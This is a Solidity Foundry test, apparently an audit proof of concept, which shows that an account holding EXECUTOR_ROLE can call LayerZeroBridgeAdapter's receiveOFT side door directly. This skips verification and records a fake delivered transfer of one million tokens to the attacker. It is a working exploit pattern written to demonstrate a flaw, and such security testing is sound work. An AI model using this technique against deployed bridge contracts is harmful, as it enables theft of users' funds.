// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../contracts/crosschain/LayerZeroBridgeAdapter.sol";

contract LayerZeroExecutorExploit is Test {
    LayerZeroBridgeAdapter adapter;
    address admin = address(0x1);
    address attacker = address(0x1337);
    address innocentUser = address(0x2);
    
    bytes32 constant EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");
    bytes32 constant CONFIG_ROLE = keccak256("CONFIG_ROLE");

    function setUp() public {
        vm.prank(admin);
        adapter = new LayerZeroBridgeAdapter();
        
        // Setup a peer so the check passes
        vm.prank(admin);
        adapter.setPeer(
            1, // eid
            bytes32(uint256(1)), // peer address
            LayerZeroBridgeAdapter.ChainType.EVM,
            100000, // minGas
            LayerZeroBridgeAdapter.SecurityLevel.STANDARD
        );

        // Grant EXECUTOR_ROLE to attacker (simulating compromised key or malicious relayer)
        vm.prank(admin);
        adapter.grantRole(EXECUTOR_ROLE, attacker);
    }

    function test_Exploit_ReceiveOFT_SideDoor() public {
        // Attacker creates a fake transfer
        bytes32 fakeTransferId = keccak256("fake");
        bytes32 remoteToken = bytes32(uint256(0xDEAD));
        
        vm.startPrank(attacker);
        
        // Call the side door function directly
        // This bypasses any DVN logic that lzReceive might have
        adapter.receiveOFT(
            fakeTransferId,
            1, // srcEid
            remoteToken,
            bytes32(uint256(uint160(attacker))), // sender
            attacker, // recipient
            1000000 ether // amount
        );
        vm.stopPrank();
        
        // Verify state was updated
        (bytes32 tId, , , , , , , , , , LayerZeroBridgeAdapter.MessageStatus status, ) = adapter.oftTransfers(fakeTransferId);
        
        assertEq(tId, fakeTransferId);
        assertEq(uint(status), uint(LayerZeroBridgeAdapter.MessageStatus.DELIVERED));
        
        console.log("Exploit successful: Attacker effectively minted/received 1M tokens via side door.");
    }
}
